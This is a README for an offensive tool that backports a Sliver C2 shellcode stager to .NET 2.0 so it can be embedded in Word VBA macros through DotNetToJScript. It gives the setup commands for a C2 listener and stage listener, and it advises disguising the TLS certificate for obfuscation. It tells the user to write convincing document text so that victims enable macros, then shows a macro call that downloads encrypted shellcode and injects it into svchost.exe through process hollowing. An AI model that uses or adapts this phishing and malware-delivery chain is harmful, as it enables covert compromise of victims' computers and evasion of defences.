```
   _____                              _________.__  .__                    
  /     \ _____    ___________  ____ /   _____/|  | |__|__  __ ___________ 
 /  \ /  \\__  \ _/ ___\_  __ \/  _ \\_____  \ |  | |  \  \/ // __ \_  __ \
/    Y    \/ __ \\  \___|  | \(  <_> )        \|  |_|  |\   /\  ___/|  | \/
\____|__  (____  /\___  >__|   \____/_______  /|____/__| \_/  \___  >__|   
        \/     \/     \/                    \/                    \/       
                                    Macro Fishing with Sliver C2
```

Backport of [SliverLoader](https://github.com/Cyb3rDudu/SliverLoader) DLL, wellknown through [Ycf-Kel](https://medium.com/@youcef.s.kelouaz/writing-a-sliver-c2-powershell-stager-with-shellcode-compression-and-aes-encryption-9725c0201ea8) Powershell Stager for Sliver Shellcode,
from .net4 Framework to .net2 to make it usable as assembly in vba scripts generated by [DotNetToJScript](https://github.com/tyranid/DotNetToJScript).

If you want to generate VBA scripts with DotNetToJScript, the assembly must be built with .NET Framework version 2.0 to reference class methods through Visual Basic. The assembly from the stager built by [Ycf-Kel](https://medium.com/@youcef.s.kelouaz/writing-a-sliver-c2-powershell-stager-with-shellcode-compression-and-aes-encryption-9725c0201ea8) was written for .NET Framework v4.7 and thus could not be used as a drop-in assembly. This is because Office pre-loads a core DLL into memory before the script runs, which forces the loaded Common Language Runtime (CLR) to always be version 2.0 to access methods from invoked assemblies.

A workaround for this issue is to use the ActCtx object with a custom manifest to load version 4.0 classes into VBA, even though its CLR is set to version 2.0. However, I decided against this approach and instead backported the code to .NET Framework 2.0.

## Features

The stager retains the same features as the original:

- Raw Shellcode
- Compression for the second stage using deflate9 or gzip
- AES Encryption
- TLS through Self-Signed SSL
- Process Hollowing
- Reflection to avoid disk artifacts
- No hardcoded parameters
- Compatible with both 32-bit and 64-bit Office
- Serializable with DotNetToJScript

## Usage

### Setup Sliver C2
Follow the installation guide on the (wiki page)[https://sliver.sh/docs?name=Linux+Install+Script] to install Sliver C2

When the setup is complete, a profile is created first, followed by the initiation of a listener with a self-signed certificate to encrypt the transport. Finally, a stage listener is instantiated. The choice of how to create the certificate is yours; you just need a .key and a .crt file to pass to the listener. You can generate these files using Metasploit's “auxiliary/gather/impersonate_ssl” module on "random.com" for more obfuscation, or you can create a self-signed certificate.

- Setup the profile
```bash
profiles new -b  https://192.168.X.X:443 --format shellcode --arch x86 lab
# --arch either x86 or amd64 depending on the office version (most probably x86).
# lab is the name of the profile. you can use any name you want.
# -b for specifying HTTPS as the protocol.
```
- To start the listener, you need to specify the same port, IP address, and protocol that were used when creating the profile. Use the SSL certificate and key generated earlier by passing the `.crt` and `.key` files
```bash
https -L 192.168.X.X -l 443 -c /tmp/crt.crt -k /tmp/key.key
```
- Finally, use the stage-listener command to launch the staging server. Specify port 8080 with the HTTPS protocol. Use the same SSL certificate and key as for the listener. Additionally, specify the compression algorithm and the AES encryption keys as follows.
```bash
stage-listener --url https://192.168.X.X:8080 --profile lab -c /tmp/crt.crt -k /tmp/key.key -C deflate9 --aes-encrypt-key D(G+KbPeShVmYq3t6v9y$B&E)H@McQfT --aes-encrypt-iv 8y/B?E(G+KbPeShV 
# -C deflate9, gzip or no compression is supported.
# --profile must match the created profile name.
# --aes-encrypt-key The key used for the encription.
# --aes-encrypt-iv The injection vector.
```
This will result in two jobs running on ports `443` and `8080`, both with TLS enabled.

### Macro Usage
The file macrosliver.vba contains the VBA code that is directly usable in Word. Create a .docm file with convincing text to prompt the victim to enable macro execution, ensuring that the Run() function is triggered, for example, by calling it in the Auto_Open() trigger or a similar method, to catch the session with the instantiated listener. When the VBA function is executed, it deserializes the embedded stager DLL and invokes it. After that, the functions of the loader class can be called using the object o.
```VBA
    Set o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class)
    o.DownloadAndExecute "https://192.168.X.X:8080/hello.woff", "svchost.exe", "deflate9", "D(G+KbPeShVmYq3t6v9y$B&E)H@McQfT", "8y/B?E(G+KbPeShV"
```
The arguments to pass are:
1. The stage listener URL where the shellcode is hosted.
2. The binary into which the process should be injected.
3. The compression algorithm: either deflate9, gzip, or an empty string if no compression was chosen when the listener was created.
4. The AES key.
5. The AES initialization vector.



